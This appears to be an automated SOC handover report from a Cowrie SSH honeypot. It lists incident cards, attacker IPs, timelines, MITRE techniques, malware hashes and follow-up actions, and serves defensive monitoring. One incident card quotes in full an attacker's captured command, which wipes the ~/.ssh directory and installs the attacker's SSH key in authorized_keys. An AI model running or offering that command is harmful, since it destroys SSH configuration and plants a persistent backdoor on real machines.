| `2026-03-28 10:54:35` | `cowrie.session.connect` |
| `2026-03-28 10:54:35` | `cowrie.client.version` |
| `2026-03-28 10:54:35` | `cowrie.client.kex` |
| `2026-03-28 10:54:36` | `cowrie.login.success` |
| `2026-03-28 10:54:36` | `cowrie.session.params` |
| `2026-03-28 10:54:36` | `cowrie.command.input` |
| `2026-03-28 10:54:36` | `cowrie.command.failed` |
| `2026-03-28 10:54:36` | `cowrie.log.closed` |
| `2026-03-28 10:54:36` | `cowrie.session.params` |
| `2026-03-28 10:54:36` | `cowrie.command.input` |
| `2026-03-28 10:54:36` | `cowrie.session.file_download` |
| `2026-03-28 10:54:36` | `cowrie.log.closed` |
| `2026-03-28 10:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.49[.]42` to AbuseIPDB if not already reported
- [ ] Block `122.166.49[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb1404618270

| Field | Detail |
|---|---|
| **Source IP** | `122.166.49[.]42` |
| **First Seen** | 2026-03-28 10:54 |
| **Last Seen** | 2026-03-28 10:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:54:37` | `cowrie.session.connect` |
| `2026-03-28 10:54:37` | `cowrie.client.version` |
| `2026-03-28 10:54:37` | `cowrie.client.kex` |
| `2026-03-28 10:54:37` | `cowrie.login.success` |
| `2026-03-28 10:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.166.49[.]42` to AbuseIPDB if not already reported
- [ ] Block `122.166.49[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-469d9f6eb228

| Field | Detail |
|---|---|
| **Source IP** | `135.237.122[.]43` |
| **First Seen** | 2026-03-28 10:59 |
| **Last Seen** | 2026-03-28 10:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:59:35` | `cowrie.session.connect` |
| `2026-03-28 10:59:35` | `cowrie.client.version` |
| `2026-03-28 10:59:35` | `cowrie.client.kex` |
| `2026-03-28 10:59:36` | `cowrie.login.success` |
| `2026-03-28 10:59:37` | `cowrie.session.params` |
| `2026-03-28 10:59:37` | `cowrie.command.input` |
| `2026-03-28 10:59:37` | `cowrie.command.failed` |
| `2026-03-28 10:59:37` | `cowrie.log.closed` |
| `2026-03-28 10:59:37` | `cowrie.session.params` |
| `2026-03-28 10:59:37` | `cowrie.command.input` |
| `2026-03-28 10:59:38` | `cowrie.session.file_download` |
| `2026-03-28 10:59:38` | `cowrie.log.closed` |
| `2026-03-28 10:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.237.122[.]43` to AbuseIPDB if not already reported
- [ ] Block `135.237.122[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0767bb13e86a

| Field | Detail |
|---|---|
| **Source IP** | `135.237.122[.]43` |
| **First Seen** | 2026-03-28 10:59 |
| **Last Seen** | 2026-03-28 10:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 10:59:40` | `cowrie.session.connect` |
| `2026-03-28 10:59:40` | `cowrie.client.version` |
| `2026-03-28 10:59:41` | `cowrie.client.kex` |
| `2026-03-28 10:59:41` | `cowrie.login.success` |
| `2026-03-28 10:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.237.122[.]43` to AbuseIPDB if not already reported
- [ ] Block `135.237.122[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36eca2f6d613

| Field | Detail |
|---|---|
| **Source IP** | `220.132.170[.]64` |
| **First Seen** | 2026-03-28 11:20 |
| **Last Seen** | 2026-03-28 11:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 11:20:09` | `cowrie.session.connect` |
| `2026-03-28 11:20:10` | `cowrie.client.version` |
| `2026-03-28 11:20:10` | `cowrie.client.kex` |
| `2026-03-28 11:20:12` | `cowrie.login.success` |
| `2026-03-28 11:20:13` | `cowrie.direct-tcpip.request` |
| `2026-03-28 11:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.132.170[.]64` to AbuseIPDB if not already reported
- [ ] Block `220.132.170[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2f80be4ef4d

| Field | Detail |
|---|---|
| **Source IP** | `163.176.167[.]78` |
| **First Seen** | 2026-03-28 11:20 |
| **Last Seen** | 2026-03-28 11:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 11:20:18` | `cowrie.session.connect` |
| `2026-03-28 11:20:19` | `cowrie.client.version` |
| `2026-03-28 11:20:19` | `cowrie.client.kex` |
| `2026-03-28 11:20:22` | `cowrie.login.success` |
| `2026-03-28 11:20:23` | `cowrie.direct-tcpip.request` |
| `2026-03-28 11:20:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.176.167[.]78` to AbuseIPDB if not already reported
- [ ] Block `163.176.167[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bce00b66b792

| Field | Detail |
|---|---|
| **Source IP** | `218.26.205[.]154` |
| **First Seen** | 2026-03-28 12:40 |
| **Last Seen** | 2026-03-28 12:40 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 12:40:43` | `cowrie.session.connect` |
| `2026-03-28 12:40:44` | `cowrie.client.version` |
| `2026-03-28 12:40:44` | `cowrie.client.kex` |
| `2026-03-28 12:40:47` | `cowrie.login.success` |
| `2026-03-28 12:40:49` | `cowrie.direct-tcpip.request` |
| `2026-03-28 12:40:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.26.205[.]154` to AbuseIPDB if not already reported
- [ ] Block `218.26.205[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-893e6e6df6dd

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-03-28 12:40 |
| **Last Seen** | 2026-03-28 12:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 12:40:54` | `cowrie.session.connect` |
| `2026-03-28 12:40:54` | `cowrie.client.version` |
| `2026-03-28 12:40:54` | `cowrie.client.kex` |
| `2026-03-28 12:40:56` | `cowrie.login.success` |
| `2026-03-28 12:40:57` | `cowrie.direct-tcpip.request` |
| `2026-03-28 12:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `112.78.3[.]139` | **39** | 2026-03-28 10:35 | 2026-03-28 10:38 | 1m | 39 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.68.52[.]210` | 1 | 2026-03-28 12:10 | 2026-03-28 12:10 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.12.29[.]184` | 1 | 2026-03-28 11:30 | 2026-03-28 11:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.114.84[.]246` | 1 | 2026-03-28 11:47 | 2026-03-28 11:47 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.192.42[.]14` | 1 | 2026-03-28 11:51 | 2026-03-28 11:51 | 10s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.242.191[.]29` | 1 | 2026-03-28 12:42 | 2026-03-28 12:42 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.166.49[.]42` | 1 | 2026-03-28 10:54 | 2026-03-28 10:54 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `135.237.122[.]43` | 1 | 2026-03-28 10:59 | 2026-03-28 10:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `138.219.13[.]21` | 1 | 2026-03-28 12:27 | 2026-03-28 12:27 | 2s | 0 | `T1592` | 🟢 LOW |
| `157.7.200[.]152` | 1 | 2026-03-28 11:40 | 2026-03-28 11:40 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `170.83.126[.]99` | 1 | 2026-03-28 12:40 | 2026-03-28 12:41 | 31s | 0 | `T1592` | 🟢 LOW |
| `175.173.79[.]66` | 1 | 2026-03-28 11:57 | 2026-03-28 11:57 | 13s | 0 | `T1592` | 🟢 LOW |
| `178.178.222[.]47` | 1 | 2026-03-28 12:48 | 2026-03-28 12:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.61[.]221` | 1 | 2026-03-28 12:07 | 2026-03-28 12:07 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.239.54[.]162` | 1 | 2026-03-28 11:30 | 2026-03-28 11:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.73.19[.]192` | 1 | 2026-03-28 12:20 | 2026-03-28 12:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.60.252[.]90` | 1 | 2026-03-28 11:07 | 2026-03-28 11:07 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.74.192[.]203` | 1 | 2026-03-28 11:22 | 2026-03-28 11:22 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.204.108[.]217` | 1 | 2026-03-28 12:02 | 2026-03-28 12:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.210.95[.]5` | 1 | 2026-03-28 11:32 | 2026-03-28 11:32 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.59.89[.]5` | 1 | 2026-03-28 11:13 | 2026-03-28 11:13 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.59.91[.]4` | 1 | 2026-03-28 10:47 | 2026-03-28 10:47 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `50.253.166[.]185` | 1 | 2026-03-28 10:54 | 2026-03-28 10:54 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `51.68.226[.]171` | 1 | 2026-03-28 11:02 | 2026-03-28 11:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.8.104[.]168` | 1 | 2026-03-28 12:29 | 2026-03-28 12:29 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.205[.]197` | 1 | 2026-03-28 12:00 | 2026-03-28 12:00 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.237[.]191` | 1 | 2026-03-28 11:00 | 2026-03-28 11:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.66.44[.]23` | 1 | 2026-03-28 11:27 | 2026-03-28 11:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `81.13.62[.]77` | 1 | 2026-03-28 10:35 | 2026-03-28 10:35 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `170.83.126[.]99` | AR | MARANDU COMUNICACIONES SOCIEDAD DEL ESTADO | **100** ⚠️ | 8 |
| `138.219.13[.]21` | SV | ASAMBLEA LEGISLATIVA DE LA REPÚBLICA DE EL SALVADOR EN LA AMÉRICA CENTRAL | **100** ⚠️ | 11 |
| `34.41.211[.]48` | US | Google LLC | **100** ⚠️ | 42 |
| `65.20.237[.]191` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 35 |
| `117.192.42[.]14` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 12 |
| `78.66.44[.]23` | SE | Telia Network Services | **100** ⚠️ | 17 |
| `50.253.166[.]185` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 2 |
| `111.70.32[.]50` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 12 |
| `46.210.95[.]5` | IL | Cellcom Fixed Line Communication L.P | **100** ⚠️ | 28 |
| `59.8.104[.]168` | KR | Korea Telecom | **100** ⚠️ | 18 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 95 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 63 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 27 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 100 cases |
| Tool 34  | Credential Extractor        | ✅ 90 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 41 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (6.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 32 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 27 priority case(s) shown individually · 29 recon entry/entries in table (1 group(s) consolidating 39 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-28T12:51:33Z_
